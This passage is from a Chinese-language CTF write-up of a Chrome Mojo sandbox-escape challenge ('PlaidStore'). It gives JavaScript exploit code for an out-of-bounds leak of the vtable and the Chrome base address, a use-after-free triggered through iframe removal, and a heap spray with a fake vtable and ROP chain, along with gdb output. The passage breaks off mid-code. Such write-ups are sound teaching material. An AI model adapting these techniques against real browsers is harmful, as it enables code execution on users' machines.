由于impl和vector在同一段上，其应该都是通过partitionAlloc动态分配出来的，所以我们可以大量分配impl，从而使impl和vector接近线性交替存放，并最终leak出来，这里我们的判断依据是虚表地址是页对齐的，也就是最后的0x7a0是不变的，从而找到虚表地址。<br>因为虚表地址在chrome的只读数据段中(.rodata)上，所以可以通过减去偏移找到chrome的基地址。<br>这个偏移的计算相当简单，我一般直接vmmap看一下加载基地址，然后减去即可找到偏移。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ vmmap 0x55555f50a7a0</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x000055555f455000 0x000055555faf2000 r--p	&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">gdb-peda$ vmmap</span><br><span class="line">Start              End                Perm	Name</span><br><span class="line">0x000023612d770000 0x000023612d771000 ---p	mapped</span><br><span class="line">0x000023612d771000 0x000023612dc70000 rw-p	mapped</span><br><span class="line">0x0000555555554000 0x000055555824b000 r--p	&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">0x000055555824b000 0x000055555f455000 r-xp	&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">0x000055555f455000 0x000055555faf2000 r--p	&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">0x000055555faf2000 0x000055555fb4e000 rw-p	&#x2F;home&#x2F;sakura&#x2F;mojo&#x2F;chrome</span><br><span class="line">...</span><br><span class="line">gdb-peda$ p&#x2F;x 0x55555f50a7a0-0x0000555555554000</span><br><span class="line">$1 &#x3D; 0x9fb67a0</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">async function <span class="title">oob</span><span class="params">()</span></span>&#123;</span><br><span class="line">  console.<span class="built_in">log</span>(<span class="string">"oob"</span>);</span><br><span class="line">  var ps_list = [];</span><br><span class="line">  var try_size = <span class="number">100</span>;</span><br><span class="line">  var vt_addr = <span class="number">0</span>;</span><br><span class="line">  var render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">  var code_base = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(let i = <span class="number">0</span>; i &lt; try_size; i++)&#123; <span class="comment">//创建impl并store一些数据，从而创建vector</span></span><br><span class="line">    var pipe = Mojo.createMessagePipe();</span><br><span class="line">    Mojo.bindInterface(<span class="built_in">blink</span>.mojom.PlaidStore.name,</span><br><span class="line">      pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">    var tmp_ps_ptr = <span class="keyword">new</span> <span class="built_in">blink</span>.mojom.PlaidStorePtr(pipe.handle0);</span><br><span class="line">    await tmp_ps_ptr.storeData(<span class="string">"aaaa"</span>, <span class="keyword">new</span> Array(<span class="number">0x30</span>).<span class="built_in">fill</span>(<span class="number">0x31</span>))</span><br><span class="line">    ps_list.push(tmp_ps_ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(let i = <span class="number">0</span>; i &lt; try_size; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(vt_addr != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    var tmp_ps_ptr = ps_list[i];</span><br><span class="line">    let r = await tmp_ps_ptr.getData(<span class="string">"aaaa"</span>, <span class="number">0x100</span>); <span class="comment">//越界读取，这里设置成0x100，不能太大，防止读到一些不可访问的地址</span></span><br><span class="line">    let oob_data = r.data;</span><br><span class="line">    <span class="keyword">for</span>(let i = <span class="number">0x30</span>; i &lt; <span class="number">0x100</span>; i = i + <span class="number">8</span>)&#123;</span><br><span class="line">      let tmp_oob_data = b2i(oob_data.slice(i, i+<span class="number">8</span>)); <span class="comment">//因为读取到的是byte数组，所以要转回数值</span></span><br><span class="line">      <span class="keyword">if</span>(hex(tmp_oob_data &amp; <span class="number">0xfff</span>) == <span class="string">"0x7a0"</span>)&#123;</span><br><span class="line">          vt_addr = tmp_oob_data;</span><br><span class="line">          code_base = vt_addr - <span class="number">0x9fb67a0</span>;</span><br><span class="line">          console.log('vt_addr is: ', hex(vt_addr));</span><br><span class="line">          console.log('code_base is: ', hex(code_base));</span><br><span class="line">          render_frame_host_addr = b2i(oob_data.slice(i+<span class="number">8</span>, i+<span class="number">16</span>));</span><br><span class="line">          console.log('render_frame_host_addr is: ', hex(render_frame_host_addr));</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  r2p_rfh(hex(render_frame_host_addr));</span><br><span class="line">  r2p_code_base(hex(code_base));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>有了chrome的基地址，我们就可以搜索gadget来构造rop了，这里我直接参考了<a href="https://blog.keenan.top/2020/08/06/PlaidCTF-2020-PlaidStore-Mojo/" target="_blank" rel="noopener">这篇文章</a>里使用的gadaget。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary&#x3D;.&#x2F;chrome &gt; gadget.txt</span><br></pre></td></tr></table></figure>
<p>也可以这样，然后直接在文件里find需要的gadget，不再赘述。</p>
<p>虚表其实就是保存着函数地址的表，虚函数调用的时候，首先根据保存的虚表地址(vtable entry)，找到虚函数表，然后再根据偏移在虚表里找到对应的函数地址。<br>所以只要改掉了其保存的函数地址，就可以在执行对应的虚函数时去执行任意代码。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-150830.png" alt=""><br>我们来看一个正常的虚函数调用的汇编，这里我断在GetData，<code>getData(&quot;aaaa&quot;, 0x100)</code>，虚函数调用也还是成员函数，所以第一个参数是this，也就是render_frame_host_的地址，然后key是”aaaa”，count是0x100。</p>
<p>如图看寄存器，rdi是<code>0x88313358100</code>，rsi是”aaaa”，rdx是0x100，和我们刚刚的推论吻合。<br>再看汇编。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rbx,rdi &#x2F;&#x2F; rdi指向PlaidStoreImpl，是this</span><br><span class="line">mov    rdi,QWORD PTR [rdi+0x8] &#x2F;&#x2F;取其偏移0x8的位置的值，刚好就是render_frame_host，到rdi</span><br><span class="line">mov    rax,QWORD PTR [rdi] &#x2F;&#x2F;取render_frame_host_偏移0x0位置的值，也就是vtable entry到rax里</span><br><span class="line">call   QWORD PTR [rax+0x160] &#x2F;&#x2F;vtable entry指向虚表基地址vt_base_addr，call将跳转到vt_base_addr+0x160处保存的函数地址去执行。</span><br></pre></td></tr></table></figure>
<p>这里就是在call虚函数IsRenderFrameLive，这个函数的地址保存在[rax+0x160]，而由于前面所述的UAF的原因，render_frame_host_地址处的所有内容完全可控，所以rax的值我们完全可控。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>chrome上比较常用的是劫持栈指针到我们可控的位置,这里<code>render_frame_host_</code>里的内容我们就完全可控，我们可以把栈指针劫持到<code>render_frame_host_</code>上。<br>让rax里保存的地址为<code>addr render_frame_host_+0x10</code>，这里就是新的虚表了。</p>
<p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2020-09-22-160738.jpg" alt=""></p>
<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>接下来的执行将分成两部分。</p>
<ul>
<li>首先对于<code>#parent</code><ul>
<li>创建一个child iframe</li>
<li>然后通过MojoTest flag的特性，创建一个kPwnInterfaceName拦截器，并注册对应的处理函数</li>
<li>处理函数逻辑为<ul>
<li>关闭拦截器</li>
<li>从接收到的MojoInterfaceRequestEvent里取出传过来的handle，用来初始化一个PlaidStorePtr指针plaid_store_ptr</li>
<li>返回这个指针给<code>#parent</code></li>
</ul>
</li>
<li>打开拦截器</li>
</ul>
</li>
<li>对于<code>#child</code><ul>
<li>执行oob函数来leak出自己的render_frame_host_和chrome的基地址</li>
<li>创建Message pipe，将receiver端传给browser，用来bind到一个PlaidStoreImpl实例上</li>
<li>将remote端通过<code>Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, &quot;process&quot;);</code>发给拦截器，从而触发对应的处理函数。</li>
</ul>
</li>
<li>这样即使child iframe被remove掉，remote端仍被parent持有，所以message pipe不会被中断，和其绑定的child iframe里对应的PlaidStoreImpl也不会被析构，但此时PlaidStoreImpl里保存的child iframe的render_frame_host_已经被析构掉了。</li>
<li>此时，通过<code>#parent</code>里保存的plaid_store_ptr，就可以从remote端调用browser里PlaidStoreImpl的函数，从而触发UAF，具体代码如下:<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">allocateRFH</span>(<span class="params">src</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    iframe.src = src;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(iframe);</span><br><span class="line">    <span class="keyword">return</span> iframe;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">freeRFH</span>(<span class="params">iframe</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kPwnInterfaceName = <span class="string">"pwn"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendPtr</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">    <span class="comment">// bind the InstalledAppProvider with the child rfh</span></span><br><span class="line">    Mojo.bindInterface(blink.mojom.PlaidStore.name,</span><br><span class="line">        pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// pass the endpoint handle to the parent rfh</span></span><br><span class="line">    Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, <span class="string">"process"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFreedPtr</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// create child iframe, allocate new RenderFrameHost</span></span><br><span class="line">        <span class="keyword">var</span> frame = allocateRFH(<span class="built_in">window</span>.location.href + <span class="string">"#child"</span>); <span class="comment">// designate the child by hash</span></span><br><span class="line">        <span class="comment">// intercept bindInterface calls for this process to accept the handle from the child</span></span><br><span class="line">        <span class="keyword">let</span> interceptor = <span class="keyword">new</span> MojoInterfaceInterceptor(kPwnInterfaceName, <span class="string">"process"</span>);</span><br><span class="line">        interceptor.oninterfacerequest = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">            <span class="comment">// e is MojoInterfaceRequestEvent</span></span><br><span class="line">            interceptor.stop();</span><br><span class="line">            <span class="comment">// bind the remote</span></span><br><span class="line">            <span class="keyword">var</span> plaid_store_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(e.handle);</span><br><span class="line">            <span class="comment">// get child iframe render_frame_host_addr</span></span><br><span class="line">            iframe_render_frame_host_addr = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'render_frame_host_addr'</span>).innerText);</span><br><span class="line">            code_base = <span class="built_in">parseInt</span>(<span class="built_in">window</span>.frames[<span class="number">0</span>].window.document.getElementById(<span class="string">'code_base'</span>).innerText);</span><br><span class="line">            freeRFH(frame);</span><br><span class="line">            resolve(plaid_store_ptr);</span><br><span class="line">        &#125;</span><br><span class="line">        interceptor.start();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// for #child</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.location.hash == <span class="string">"#child"</span>) &#123;</span><br><span class="line">        <span class="keyword">await</span> oob();</span><br><span class="line">        sendPtr();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// for #parent</span></span><br><span class="line">    iframe_render_frame_host_addr = <span class="number">0</span>;</span><br><span class="line">    code_base = <span class="number">0</span></span><br><span class="line">    <span class="keyword">var</span> try_size = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">var</span> kRenderFrameHost = <span class="number">0xc28</span>;</span><br><span class="line">    <span class="keyword">let</span> ptr = <span class="keyword">await</span> getFreedPtr();<span class="comment">// free iframe</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
剩下最后一个问题，如何通过heap spray来占坑我们之前释放掉的iframe里的<code>render_frame_host_</code>，其实很简单，因为chrome里heap management是使用TCMalloc的。<br>所以我们通过StoreData分配出来的<code>vector&lt;uint8_t&gt;</code>和<code>render_frame_host_</code>是使用同样的分配器，也就是只要大量分配大小和<code>render_frame_host_</code>相等的vector就可能占位上。</li>
</ul>
<p>这里我们先看一下<code>render_frame_host_</code>的大小，步骤如下，最终找到大小是0xc28 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info functions RenderFrameHostImpl::RenderFrameHostImpl</span><br><span class="line">All functions matching regular expression &quot;RenderFrameHostImpl::RenderFrameHostImpl&quot;:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000003b21d80  content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)</span><br><span class="line">0x0000000003b21d80  content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)</span><br><span class="line">gdb-peda$ b content::RenderFrameHostImpl::RenderFrameHostImpl</span><br><span class="line">Breakpoint 1 at 0x3b21d84</span><br><span class="line">...</span><br><span class="line">gdb-peda$ r</span><br><span class="line">Thread 1 &quot;chrome&quot; hit Breakpoint 1, 0x0000555559075d84 in content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line"></span><br><span class="line">gdb-peda$ bt</span><br><span class="line">#0  0x0000555559075d84 in content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line">#1  0x0000555559075a96 in content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line">...</span><br><span class="line">gdb-peda$ b content::RenderFrameHostFactory::Create</span><br><span class="line">Breakpoint 2 at 0x5555590759e4</span><br><span class="line">gdb-peda$ r &#x2F;&#x2F; 重新运行</span><br><span class="line">Thread 1 &quot;chrome&quot; hit Breakpoint 2, 0x00005555590759e4 in content::RenderFrameHostFactory::Create(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool) ()</span><br><span class="line">...</span><br><span class="line">单步执行</span><br><span class="line">   0x555559075a52 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+114&gt;:	mov    edi,0xc28 &#x2F;&#x2F;可以看出大小是0xc28</span><br><span class="line">   0x555559075a57 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+119&gt;:	call   0x55555ac584b0 &lt;_ZnwmRKSt9nothrow_t&gt;</span><br><span class="line">   0x555559075a5c &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+124&gt;:	mov    rdi,rax</span><br><span class="line">   0x555559075a5f &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+127&gt;:	mov    rax,QWORD PTR [r14]</span><br><span class="line">   0x555559075a62 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+130&gt;:	mov    QWORD PTR [rbp-0x38],rax</span><br><span class="line">   0x555559075a66 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+134&gt;:	mov    QWORD PTR [r14],0x0</span><br><span class="line">   0x555559075a6d &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+141&gt;:	sub    rsp,0x8</span><br><span class="line">   0x555559075a71 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+145&gt;:	movzx  eax,BYTE PTR [rbp+0x20]</span><br><span class="line">   0x555559075a75 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+149&gt;:	lea    rdx,[rbp-0x38]</span><br><span class="line">   0x555559075a79 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+153&gt;:	mov    r14,rdi</span><br><span class="line">   0x555559075a7c &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+156&gt;:	mov    rsi,rbx</span><br><span class="line">   0x555559075a7f &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+159&gt;:	mov    rcx,r13</span><br><span class="line">   0x555559075a82 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+162&gt;:	mov    r8,r12</span><br><span class="line">   0x555559075a85 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+165&gt;:	mov    r9,r15</span><br><span class="line">   0x555559075a88 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+168&gt;:	push   rax</span><br><span class="line">   0x555559075a89 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+169&gt;:	mov    eax,DWORD PTR [rbp+0x18]</span><br><span class="line">   0x555559075a8c &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+172&gt;:	push   rax</span><br><span class="line">   0x555559075a8d &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+173&gt;:	mov    eax,DWORD PTR [rbp+0x10]</span><br><span class="line">&#x3D;&gt; 0x555559075a90 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+176&gt;:	push   rax</span><br><span class="line">   0x555559075a91 &lt;_ZN7content22RenderFrameHostFactory6CreateEPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib+177&gt;:	</span><br><span class="line">    call   0x555559075d80 &lt;_ZN7content19RenderFrameHostImplC2EPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">可以看出call的两个函数分别为new和RenderFrameHostImpl的构造函数</span><br><span class="line">sakura@ubuntu:~&#x2F;mojo$ c++filt _ZN7content19RenderFrameHostImplC2EPNS_12SiteInstanceE13scoped_refptrINS_18RenderViewHostImplEEPNS_23RenderFrameHostDelegateEPNS_9FrameTreeEPNS_13FrameTreeNodeEiib</span><br><span class="line">content::RenderFrameHostImpl::RenderFrameHostImpl(content::SiteInstance*, scoped_refptr&lt;content::RenderViewHostImpl&gt;, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)</span><br><span class="line"></span><br><span class="line">sakura@ubuntu:~&#x2F;mojo$ c++filt _ZnwmRKSt9nothrow_t</span><br><span class="line">operator new(unsigned long, std::nothrow_t const&amp;)</span><br></pre></td></tr></table></figure>
<p>我们可以直接拿之前获取的remote来调storeData，并在data里fake好gadaget和数据，还是刚刚的那个图。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> uaf_ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(kRenderFrameHost);</span><br><span class="line"><span class="keyword">var</span> uaf_ta = <span class="keyword">new</span> BigUint64Array(uaf_ab);</span><br><span class="line">uaf_ta[<span class="number">0</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>;</span><br><span class="line">uaf_ta[<span class="number">1</span>] = <span class="number">0n</span>;</span><br><span class="line">uaf_ta[<span class="number">2</span>] = <span class="number">0n</span>; <span class="comment">//use by pop rbp</span></span><br><span class="line">uaf_ta[<span class="number">3</span>] = BigInt(pop_rdi_ret);</span><br><span class="line">uaf_ta[<span class="number">4</span>] = BigInt(iframe_render_frame_host_addr)+<span class="number">0x10n</span>+<span class="number">0x160n</span>+<span class="number">8n</span>;</span><br><span class="line">uaf_ta[<span class="number">5</span>] = BigInt(pop_rsi_ret);</span><br><span class="line">uaf_ta[<span class="number">6</span>] = BigInt(<span class="number">0</span>);</span><br><span class="line">uaf_ta[<span class="number">7</span>] = BigInt(pop_rdx_ret);</span><br><span class="line">uaf_ta[<span class="number">8</span>] = BigInt(<span 